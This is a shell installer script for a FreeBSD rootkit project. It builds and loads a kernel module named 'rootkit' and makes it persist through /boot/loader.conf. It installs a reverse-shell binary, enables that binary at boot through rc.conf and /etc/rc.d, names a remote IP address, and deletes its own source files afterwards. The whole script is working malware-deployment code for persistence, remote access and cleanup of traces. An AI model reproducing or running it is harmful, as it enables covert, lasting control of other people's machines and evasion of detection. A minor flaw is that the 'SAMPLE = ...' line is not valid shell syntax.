
#!/bin/sh
#
# Copyright (c) 2019 Jasper Lowell
# Copyright (c) 2019 Wesley Hamburger
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 3.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#

write_to_rc_conf()
{	
	echo $1 >> $BINARIES/rshell
}

populate_rc_conf_file()
{
	write_to_rc_conf "#!/bin/sh"
	write_to_rc_conf "# PROVIDE: rshell"
	write_to_rc_conf "REMOTE=${REMOTE}"
	write_to_rc_conf "name=\"$RSHELL_CONF_FILE\""
	write_to_rc_conf "rcvar=\`set_rcvar\`"
	write_to_rc_conf "start_cmd=\"/usr/bin/rshell_target\""
	write_to_rc_conf "stop_cmd=\":\""
	write_to_rc_conf "\r\n"
	write_to_rc_conf "load_rc_config \$name"
	write_to_rc_conf "\"\$1\""
}

SRC=$(dirname "$(realpath $0)")

NAME="rootkit"
KO="$NAME.ko"
KMOD=$SRC/src/kmod
BINARIES=$SRC/src/bin

RSHELL_BIN="rshell_target"
RSHELL_CONF_FILE="rshell"
RSHELL_INSTALL="/etc/rc.d"
RSHELL_CONF="/etc/rc.conf"
USR_BIN="/usr/sbin"


INSTALL="/boot/modules"
LOADER_CONF="/boot/loader.conf"

cat << "EOF"
 _                   _ _____     _____     _____
| |_ ___ ___ ___ ___| |   __|___| __  |_ _| __  |___
| '_| -_|  _|   | -_| |__   |  _|    -| | | __ -|_ -|
|_,_|___|_| |_|_|___|_|_____|___|__|__|___|_____|___|

EOF

cd $KMOD

echo ">> Clean existing build."
make clean

echo ">> Build rootkit."
make

echo ">> Install rootkit kernel module."
mv $KMOD/$KO $INSTALL/$KO
kldload $INSTALL/$KO
echo ""$NAME"_load=\"YES\"" > $LOADER_CONF

echo ">> Install revershell shell for boot."
cp $BINARIES/$RSHELL_BIN $USR_BIN/

echo ">> Enable reverse-shell on boot."
echo "${RSHELL_CONF_FILE}_enable=\"YES\"" >> $RSHELL_CONF

SAMPLE = "188.102.103.192"
echo ">> Move configuration file into rc."
cp $BINARIES/$RSHELL_CONF_FILE $RSHELL_INSTALL

if [ "$1" = "DEBUG" ]
then
        echo ">> Ignore source files."
else
	echo ">> Purge source files."
	rm -rf $SRC
fi
